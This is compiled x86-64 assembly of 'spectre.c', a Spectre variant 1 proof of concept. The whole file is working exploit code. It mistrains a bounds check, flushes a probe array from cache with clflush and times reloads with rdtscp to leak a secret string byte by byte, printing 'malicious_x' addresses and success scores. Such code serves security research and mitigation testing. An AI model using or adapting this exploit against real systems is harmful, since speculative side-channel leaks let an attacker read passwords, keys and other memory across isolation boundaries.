	.text
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	movslq	array1_size(%rip), %rcx
	xorl	%eax, %eax
	cmpq	%rdi, %rcx
	seta	%al
	retq
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	movslq	array1_size(%rip), %rax
	cmpq	%rdi, %rax
	jbe	.LBB1_2
# %bb.1:
	leaq	array1(%rip), %rax
	movzbl	(%rdi,%rax), %eax
	shlq	$9, %rax
	leaq	array2(%rip), %rcx
	movb	(%rax,%rcx), %al
	subb	%al, temp(%rip)
.LBB1_2:
	retq
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	pushq	%r15
	.cfi_def_cfa_offset 24
	pushq	%r14
	.cfi_def_cfa_offset 32
	pushq	%r13
	.cfi_def_cfa_offset 40
	pushq	%r12
	.cfi_def_cfa_offset 48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	subq	$40, %rsp
	.cfi_def_cfa_offset 96
	.cfi_offset %rbx, -56
	.cfi_offset %r12, -48
	.cfi_offset %r13, -40
	.cfi_offset %r14, -32
	.cfi_offset %r15, -24
	.cfi_offset %rbp, -16
	movq	%rdx, 24(%rsp)                  # 8-byte Spill
	movq	%rsi, 16(%rsp)                  # 8-byte Spill
	movq	%rdi, 32(%rsp)                  # 8-byte Spill
	leaq	readMemoryByte.results(%rip), %r15
	movl	$1024, %edx                     # imm = 0x400
	movq	%r15, %rdi
	xorl	%esi, %esi
	callq	memset@PLT
	movl	$999, %r13d                     # imm = 0x3E7
	leaq	array2(%rip), %r14
	.p2align	4, 0x90
.LBB2_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_2 Depth 2
                                        #     Child Loop BB2_4 Depth 2
                                        #       Child Loop BB2_23 Depth 3
                                        #     Child Loop BB2_7 Depth 2
                                        #     Child Loop BB2_12 Depth 2
	movq	%r15, %rbx
	xorl	%eax, %eax
	.p2align	4, 0x90
.LBB2_2:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	(%rax,%r14)
	clflush	512(%rax,%r14)
	clflush	1024(%rax,%r14)
	clflush	1536(%rax,%r14)
	clflush	2048(%rax,%r14)
	clflush	2560(%rax,%r14)
	clflush	3072(%rax,%r14)
	clflush	3584(%rax,%r14)
	addq	$4096, %rax                     # imm = 0x1000
	cmpq	$131072, %rax                   # imm = 0x20000
	jne	.LBB2_2
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	movl	%r13d, %eax
	cltd
	idivl	array1_size(%rip)
	movl	%edx, %r12d
	movq	%r12, %rbp
	xorq	32(%rsp), %rbp                  # 8-byte Folded Reload
	movl	$29, %r15d
	jmp	.LBB2_4
	.p2align	4, 0x90
.LBB2_5:                                #   in Loop: Header=BB2_4 Depth=2
	movl	%r15d, %eax
	movl	$2863311531, %ecx               # imm = 0xAAAAAAAB
	imulq	%rcx, %rax
	shrq	$34, %rax
	addl	%eax, %eax
	leal	(%rax,%rax,2), %eax
	notl	%eax
	addl	%r15d, %eax
	andl	$-65536, %eax                   # imm = 0xFFFF0000
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%rbp, %rdi
	xorq	%r12, %rdi
	callq	victim_function
	subl	$1, %r15d
	jb	.LBB2_6
.LBB2_4:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_23 Depth 3
	clflush	array1_size(%rip)
	movl	$0, 12(%rsp)
	movl	12(%rsp), %eax
	cmpl	$99, %eax
	jg	.LBB2_5
	.p2align	4, 0x90
.LBB2_23:                               #   Parent Loop BB2_1 Depth=1
                                        #     Parent Loop BB2_4 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	addl	$1, 12(%rsp)
	movl	12(%rsp), %eax
	cmpl	$100, %eax
	jl	.LBB2_23
	jmp	.LBB2_5
	.p2align	4, 0x90
.LBB2_6:                                #   in Loop: Header=BB2_1 Depth=1
	movl	$13, %edi
	movq	%rbx, %r15
	leaq	array1(%rip), %r8
	jmp	.LBB2_7
	.p2align	4, 0x90
.LBB2_10:                               #   in Loop: Header=BB2_7 Depth=2
	addl	$167, %edi
	cmpl	$42765, %edi                    # imm = 0xA70D
	je	.LBB2_11
.LBB2_7:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movzbl	%dil, %ebx
	movq	%rbx, %rbp
	shlq	$9, %rbp
	rdtscp
	movq	%rdx, %rsi
	shlq	$32, %rsi
	orq	%rax, %rsi
	movzbl	(%rbp,%r14), %eax
	rdtscp
	shlq	$32, %rdx
	orq	%rax, %rdx
	subq	%rsi, %rdx
	cmpq	$100, %rdx
	ja	.LBB2_10
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	movl	%r13d, %eax
	cltd
	idivl	array1_size(%rip)
                                        # kill: def $edx killed $edx def $rdx
	cmpb	(%rdx,%r8), %dil
	je	.LBB2_10
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	movl	%ebx, %eax
	addl	$1, (%r15,%rax,4)
	jmp	.LBB2_10
	.p2align	4, 0x90
.LBB2_11:                               #   in Loop: Header=BB2_1 Depth=1
	movl	$-1, %eax
	movq	%r15, %rdx
	xorl	%esi, %esi
	movl	$-1, %edi
	jmp	.LBB2_12
	.p2align	4, 0x90
.LBB2_13:                               #   in Loop: Header=BB2_12 Depth=2
	movl	%eax, %edi
	movl	%esi, %eax
.LBB2_18:                               #   in Loop: Header=BB2_12 Depth=2
	addq	$1, %rsi
	addq	$4, %rdx
	cmpq	$256, %rsi                      # imm = 0x100
	je	.LBB2_19
.LBB2_12:                               #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	testl	%eax, %eax
	js	.LBB2_13
# %bb.14:                               #   in Loop: Header=BB2_12 Depth=2
	movl	(%rdx), %ebp
	movl	%eax, %ebx
	cmpl	(%r15,%rbx,4), %ebp
	jge	.LBB2_13
# %bb.15:                               #   in Loop: Header=BB2_12 Depth=2
	testl	%edi, %edi
	js	.LBB2_17
# %bb.16:                               #   in Loop: Header=BB2_12 Depth=2
	movl	%edi, %ebx
	cmpl	(%r15,%rbx,4), %ebp
	jl	.LBB2_18
.LBB2_17:                               #   in Loop: Header=BB2_12 Depth=2
	movl	%esi, %edi
	jmp	.LBB2_18
	.p2align	4, 0x90
.LBB2_19:                               #   in Loop: Header=BB2_1 Depth=1
	movslq	%eax, %rdx
	movl	(%r15,%rdx,4), %esi
	movslq	%edi, %rax
	movl	(%r15,%rax,4), %edi
	leal	(%rdi,%rdi), %ebp
	addl	$5, %ebp
	cmpl	%ebp, %esi
	jge	.LBB2_22
# %bb.20:                               #   in Loop: Header=BB2_1 Depth=1
	xorl	$2, %esi
	orl	%edi, %esi
	je	.LBB2_22
# %bb.21:                               #   in Loop: Header=BB2_1 Depth=1
	leal	-1(%r13), %esi
	cmpl	$1, %r13d
	movl	%esi, %r13d
	ja	.LBB2_1
.LBB2_22:
	xorl	%ecx, readMemoryByte.results(%rip)
	leaq	readMemoryByte.results(%rip), %rcx
	movq	16(%rsp), %rdi                  # 8-byte Reload
	movb	%dl, (%rdi)
	movl	(%rcx,%rdx,4), %edx
	movq	24(%rsp), %rsi                  # 8-byte Reload
	movl	%edx, (%rsi)
	movb	%al, 1(%rdi)
	movl	(%rcx,%rax,4), %eax
	movl	%eax, 4(%rsi)
	addq	$40, %rsp
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%r12
	.cfi_def_cfa_offset 40
	popq	%r13
	.cfi_def_cfa_offset 32
	popq	%r14
	.cfi_def_cfa_offset 24
	popq	%r15
	.cfi_def_cfa_offset 16
	popq	%rbp
	.cfi_def_cfa_offset 8
	retq
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	pushq	%r15
	.cfi_def_cfa_offset 24
	pushq	%r14
	.cfi_def_cfa_offset 32
	pushq	%r13
	.cfi_def_cfa_offset 40
	pushq	%r12
	.cfi_def_cfa_offset 48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	subq	$56, %rsp
	.cfi_def_cfa_offset 112
	.cfi_offset %rbx, -56
	.cfi_offset %r12, -48
	.cfi_offset %r13, -40
	.cfi_offset %r14, -32
	.cfi_offset %r15, -24
	.cfi_offset %rbp, -16
	movq	%rsi, 32(%rsp)                  # 8-byte Spill
	movl	%edi, 28(%rsp)                  # 4-byte Spill
	movq	stdin@GOTPCREL(%rip), %rbx
	leaq	array1(%rip), %r13
	leaq	array2(%rip), %r12
	jmp	.LBB3_1
	.p2align	4, 0x90
.LBB3_34:                               #   in Loop: Header=BB3_1 Depth=1
	xorl	%eax, %eax
	callq	getpid@PLT
	leaq	.L.str.13(%rip), %rdi
	leaq	check+33(%rip), %rsi
	movl	%eax, %edx
	xorl	%eax, %eax
	callq	printf@PLT
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_8 Depth 2
                                        #       Child Loop BB3_9 Depth 3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_36 Depth 5
                                        #         Child Loop BB3_15 Depth 4
                                        #         Child Loop BB3_20 Depth 4
	movq	(%rbx), %rdi
	callq	getc@PLT
	shll	$24, %eax
	cmpl	$167772160, %eax                # imm = 0xA000000
	je	.LBB3_1
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$1761607680, %eax               # imm = 0x69000000
	je	.LBB3_34
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$1912602624, %eax               # imm = 0x72000000
	jne	.LBB3_35
# %bb.4:                                #   in Loop: Header=BB3_1 Depth=1
	movq	secret(%rip), %rdx
	leaq	.L.str.1(%rip), %rdi
	movq	%rdx, %rsi
	xorl	%eax, %eax
	callq	printf@PLT
	movq	secret(%rip), %rdi
	movq	%rdi, %rax
	subq	%r13, %rax
	movq	%rax, 16(%rsp)
	callq	strlen@PLT
	movq	%rax, %rbp
	movl	%ebp, 8(%rsp)
	movl	$131072, %edx                   # imm = 0x20000
	movq	%r12, %rdi
	movl	$1, %esi
	callq	memset@PLT
	cmpl	$3, 28(%rsp)                    # 4-byte Folded Reload
	jne	.LBB3_6
# %bb.5:                                #   in Loop: Header=BB3_1 Depth=1
	movq	32(%rsp), %rbx                  # 8-byte Reload
	movq	8(%rbx), %rdi
	leaq	.L.str.2(%rip), %rsi
	leaq	16(%rsp), %rdx
	xorl	%eax, %eax
	callq	__isoc99_sscanf@PLT
	subq	%r13, 16(%rsp)
	movq	16(%rbx), %rdi
	leaq	.L.str.3(%rip), %rsi
	leaq	8(%rsp), %rdx
	xorl	%eax, %eax
	callq	__isoc99_sscanf@PLT
	movq	16(%rsp), %rsi
	movl	8(%rsp), %edx
	leaq	.L.str.4(%rip), %rdi
	xorl	%eax, %eax
	callq	printf@PLT
	movl	8(%rsp), %ebp
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	leaq	.L.str.5(%rip), %rdi
	movl	%ebp, %esi
	xorl	%eax, %eax
	callq	printf@PLT
	movl	8(%rsp), %eax
	leal	-1(%rax), %ecx
	movl	%ecx, 8(%rsp)
	testl	%eax, %eax
	jle	.LBB3_33
# %bb.7:                                #   in Loop: Header=BB3_1 Depth=1
	xorl	%ebx, %ebx
	jmp	.LBB3_8
	.p2align	4, 0x90
.LBB3_32:                               #   in Loop: Header=BB3_8 Depth=2
	movl	$10, %edi
	callq	putchar@PLT
	movl	8(%rsp), %eax
	leal	-1(%rax), %ecx
	movl	%ecx, 8(%rsp)
	testl	%eax, %eax
	movq	40(%rsp), %rbx                  # 8-byte Reload
	jle	.LBB3_33
.LBB3_8:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_9 Depth 3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_36 Depth 5
                                        #         Child Loop BB3_15 Depth 4
                                        #         Child Loop BB3_20 Depth 4
	movq	16(%rsp), %rsi
	movq	secret(%rip), %rax
	movsbl	(%rax,%rbx), %edx
	leaq	.L.str.6(%rip), %rdi
	xorl	%eax, %eax
	callq	printf@PLT
	addq	$1, %rbx
	movq	%rbx, 40(%rsp)                  # 8-byte Spill
	movq	16(%rsp), %rax
	movq	%rax, 48(%rsp)                  # 8-byte Spill
	addq	$1, %rax
	movq	%rax, 16(%rsp)
	movl	$1024, %edx                     # imm = 0x400
	leaq	readMemoryByte.results(%rip), %rdi
	xorl	%esi, %esi
	callq	memset@PLT
	movl	$999, %eax                      # imm = 0x3E7
	.p2align	4, 0x90
.LBB3_9:                                #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        # =>    This Loop Header: Depth=3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_36 Depth 5
                                        #         Child Loop BB3_15 Depth 4
                                        #         Child Loop BB3_20 Depth 4
	xorl	%ecx, %ecx
	movl	$2863311531, %ebp               # imm = 0xAAAAAAAB
	.p2align	4, 0x90
.LBB3_10:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	clflush	(%rcx,%r12)
	clflush	512(%rcx,%r12)
	clflush	1024(%rcx,%r12)
	clflush	1536(%rcx,%r12)
	clflush	2048(%rcx,%r12)
	clflush	2560(%rcx,%r12)
	clflush	3072(%rcx,%r12)
	clflush	3584(%rcx,%r12)
	addq	$4096, %rcx                     # imm = 0x1000
	cmpq	$131072, %rcx                   # imm = 0x20000
	jne	.LBB3_10
# %bb.11:                               #   in Loop: Header=BB3_9 Depth=3
	movq	%rax, %rbx
                                        # kill: def $eax killed $eax killed $rax
	cltd
	idivl	array1_size(%rip)
	movl	%edx, %r15d
	movq	48(%rsp), %r14                  # 8-byte Reload
	xorq	%r15, %r14
	movl	$29, %r13d
	jmp	.LBB3_12
	.p2align	4, 0x90
.LBB3_13:                               #   in Loop: Header=BB3_12 Depth=4
	movl	%r13d, %eax
	imulq	%rbp, %rax
	shrq	$34, %rax
	addl	%eax, %eax
	leal	(%rax,%rax,2), %eax
	notl	%eax
	addl	%r13d, %eax
	andl	$-65536, %eax                   # imm = 0xFFFF0000
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%r14, %rdi
	xorq	%r15, %rdi
	callq	victim_function
	subl	$1, %r13d
	jb	.LBB3_14
.LBB3_12:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Loop Header: Depth=4
                                        #           Child Loop BB3_36 Depth 5
	clflush	array1_size(%rip)
	movl	$0, 12(%rsp)
	movl	12(%rsp), %eax
	cmpl	$99, %eax
	jg	.LBB3_13
	.p2align	4, 0x90
.LBB3_36:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        #         Parent Loop BB3_12 Depth=4
                                        # =>        This Inner Loop Header: Depth=5
	addl	$1, 12(%rsp)
	movl	12(%rsp), %eax
	cmpl	$100, %eax
	jl	.LBB3_36
	jmp	.LBB3_13
	.p2align	4, 0x90
.LBB3_14:                               #   in Loop: Header=BB3_9 Depth=3
	movl	$13, %edi
	leaq	array1(%rip), %r13
	leaq	readMemoryByte.results(%rip), %r8
	movq	%rbx, %r9
	jmp	.LBB3_15
	.p2align	4, 0x90
.LBB3_18:                               #   in Loop: Header=BB3_15 Depth=4
	addl	$167, %edi
	cmpl	$42765, %edi                    # imm = 0xA70D
	je	.LBB3_19
.LBB3_15:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	movzbl	%dil, %ebx
	movq	%rbx, %rbp
	shlq	$9, %rbp
	rdtscp
	movq	%rdx, %rsi
	shlq	$32, %rsi
	orq	%rax, %rsi
	movzbl	(%rbp,%r12), %eax
	rdtscp
	shlq	$32, %rdx
	orq	%rax, %rdx
	subq	%rsi, %rdx
	cmpq	$100, %rdx
	ja	.LBB3_18
# %bb.16:                               #   in Loop: Header=BB3_15 Depth=4
	movl	%r9d, %eax
	cltd
	idivl	array1_size(%rip)
                                        # kill: def $edx killed $edx def $rdx
	cmpb	(%rdx,%r13), %dil
	je	.LBB3_18
# %bb.17:                               #   in Loop: Header=BB3_15 Depth=4
	movl	%ebx, %eax
	addl	$1, (%r8,%rax,4)
	jmp	.LBB3_18
	.p2align	4, 0x90
.LBB3_19:                               #   in Loop: Header=BB3_9 Depth=3
	movl	$-1, %eax
	movq	%r8, %rdx
	xorl	%esi, %esi
	movl	$-1, %r15d
	jmp	.LBB3_20
	.p2align	4, 0x90
.LBB3_21:                               #   in Loop: Header=BB3_20 Depth=4
	movl	%eax, %r15d
	movl	%esi, %eax
.LBB3_26:                               #   in Loop: Header=BB3_20 Depth=4
	addq	$1, %rsi
	addq	$4, %rdx
	cmpq	$256, %rsi                      # imm = 0x100
	je	.LBB3_27
.LBB3_20:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	testl	%eax, %eax
	js	.LBB3_21
# %bb.22:                               #   in Loop: Header=BB3_20 Depth=4
	movl	(%rdx), %edi
	movl	%eax, %ebp
	cmpl	(%r8,%rbp,4), %edi
	jge	.LBB3_21
# %bb.23:                               #   in Loop: Header=BB3_20 Depth=4
	testl	%r15d, %r15d
	js	.LBB3_25
# %bb.24:                               #   in Loop: Header=BB3_20 Depth=4
	movl	%r15d, %ebp
	cmpl	(%r8,%rbp,4), %edi
	jl	.LBB3_26
.LBB3_25:                               #   in Loop: Header=BB3_20 Depth=4
	movl	%esi, %r15d
	jmp	.LBB3_26
	.p2align	4, 0x90
.LBB3_27:                               #   in Loop: Header=BB3_9 Depth=3
	movslq	%eax, %r14
	movl	(%r8,%r14,4), %edx
	movslq	%r15d, %rbx
	movl	(%r8,%rbx,4), %esi
	leal	(%rsi,%rsi), %edi
	addl	$5, %edi
	cmpl	%edi, %edx
	jge	.LBB3_30
# %bb.28:                               #   in Loop: Header=BB3_9 Depth=3
	xorl	$2, %edx
	orl	%esi, %edx
	je	.LBB3_30
# %bb.29:                               #   in Loop: Header=BB3_9 Depth=3
	leal	-1(%r9), %edx
	cmpl	$1, %r9d
	movl	%edx, %eax
	ja	.LBB3_9
.LBB3_30:                               #   in Loop: Header=BB3_8 Depth=2
	xorl	%ecx, readMemoryByte.results(%rip)
	movl	(%r8,%r14,4), %ebp
	movl	(%r8,%rbx,4), %ebx
	leal	(%rbx,%rbx), %eax
	cmpl	%eax, %ebp
	leaq	.L.str.8(%rip), %rsi
	leaq	.L.str.9(%rip), %rax
	cmovlq	%rax, %rsi
	leaq	.L.str.7(%rip), %rdi
	xorl	%eax, %eax
	callq	printf@PLT
	movzbl	%r14b, %esi
	leal	-32(%rsi), %eax
	cmpb	$95, %al
	movl	$63, %edx
	cmovbl	%esi, %edx
	leaq	.L.str.10(%rip), %rdi
                                        # kill: def $esi killed $esi killed $rsi
	movl	%ebp, %ecx
	xorl	%eax, %eax
	callq	printf@PLT
	testl	%ebx, %ebx
	jle	.LBB3_32
# %bb.31:                               #   in Loop: Header=BB3_8 Depth=2
	movzbl	%r15b, %esi
	leal	-32(%rsi), %eax
	cmpb	$95, %al
	movl	$63, %edx
	cmovbl	%esi, %edx
	leaq	.L.str.11(%rip), %rdi
                                        # kill: def $esi killed $esi killed $rsi
	movl	%ebx, %ecx
	xorl	%eax, %eax
	callq	printf@PLT
	jmp	.LBB3_32
	.p2align	4, 0x90
.LBB3_33:                               #   in Loop: Header=BB3_1 Depth=1
	movq	stdin@GOTPCREL(%rip), %rbx
	jmp	.LBB3_1
.LBB3_35:
	xorl	%eax, %eax
	addq	$56, %rsp
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%r12
	.cfi_def_cfa_offset 40
	popq	%r13
	.cfi_def_cfa_offset 32
	popq	%r14
	.cfi_def_cfa_offset 24
	popq	%r15
	.cfi_def_cfa_offset 16
	popq	%rbp
	.cfi_def_cfa_offset 8
	retq
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object             # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                              # 0x10
	.size	array1_size, 4

	.type	array1,@object                  # @array1
	.globl	array1
	.p2align	4
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	3
secret:
	.quad	.L.str
	.size	secret, 8

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	array2,@object                  # @array2
	.globl	array2
	.p2align	4
array2:
	.zero	131072
	.size	array2, 131072

	.type	readMemoryByte.results,@object  # @readMemoryByte.results
	.local	readMemoryByte.results
	.comm	readMemoryByte.results,1024,16
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c ..."
	.size	.L.str.6, 41

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"%s: "
	.size	.L.str.7, 5

	.type	.L.str.8,@object                # @.str.8
.L.str.8:
	.asciz	"Success"
	.size	.L.str.8, 8

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"Unclear"
	.size	.L.str.9, 8

	.type	.L.str.10,@object               # @.str.10
.L.str.10:
	.asciz	"0x%02X='%c' score=%d "
	.size	.L.str.10, 22

	.type	.L.str.11,@object               # @.str.11
.L.str.11:
	.asciz	"(second best: 0x%02X='%c' score=%d)"
	.size	.L.str.11, 36

	.type	.L.str.13,@object               # @.str.13
.L.str.13:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.13, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
	.p2align	4
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
	.p2align	4
unused2:
	.zero	64
	.size	unused2, 64

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
